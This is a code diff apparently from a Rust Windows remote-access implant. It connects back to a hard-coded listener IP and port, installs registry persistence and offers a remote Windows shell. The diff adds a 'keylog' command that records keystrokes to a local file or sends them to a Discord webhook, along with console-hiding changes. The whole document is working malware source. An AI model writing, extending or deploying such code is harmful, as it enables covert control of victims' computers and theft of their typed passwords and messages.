@@ -1,3 +1,5 @@
+//#![windows_subsystem = "windows"]
+
 use std::net::TcpStream;
 use std::process::{Command, Stdio};
 use std::io::{Read, Write, Error, ErrorKind};
@@ -9,8 +11,9 @@ use std::path::PathBuf;
 use winreg::enums::*;
 use winreg::RegKey;
 use std::error::Error as StdError;
-use winapi::um::wincon::FreeConsole;
 use std::os::windows::process::CommandExt;
+
+pub mod keylogger;
 
 const REMOTE_HOST: &str = "192.168.1.154"; // Change this to the IP of your listening machine
 const REMOTE_PORT: u16 = 4444;        // Change this to your listening port
@@ -66,8 +69,6 @@ macro_rules! check_read {
 }
 
 fn main() {
-
-    unsafe { FreeConsole() };
     
     // Set up persistence if not already installed
     setup_persistence().unwrap_or_else(|e| {
@@ -75,8 +76,12 @@ fn main() {
     });
     
     // Main reconnection loop
-    let mut conn_down = false;
+    
     let mut stream: TcpStream = init_connection();
+
+    // IMPORTANT FLAGS
+    let mut conn_down = false;
+    
     loop {
 
         if conn_down == true {
@@ -102,7 +107,29 @@ fn main() {
                 help > Show this menu\n\
                 shell > Drop into a Windows shell\n\
                 exit > When in a shell, will exit the process\n\
+                keylog > Open a keylogger to either a log file or a Discord webhook\n\
                 ", conn_down);
+            },
+            "keylog" => {
+                check_write!(stream, b"\
+                (WARNING) Running this command more than once for a session WILL cause problems.\n\
+                This command will either create a log file on the machine, or export to a Discord WebHook or alternative.\n\
+                Hit enter to make a local log file, and paste a WebHook URL to export to a WebHook.\n\
+                GuS - KeyLogger>\
+                ", conn_down);
+
+                let option = check_read!(stream, conn_down);
+                if option.trim().len() == 0 { // Log to log file
+                    debug!("Keylogging to log file.");
+                    thread::spawn(move || {
+                        keylogger::keylog();
+                    });
+                } else { // Log to webhook
+                    debug!("Keylogging on WebHook with URL: {}", option);
+                    thread::spawn(move || {
+                        keylogger::keylog_to_webhook(option.trim().into());
+                    });
+                }
             }
             &_ => {
                 check_write!(stream, b"Bad Command.\n", conn_down);
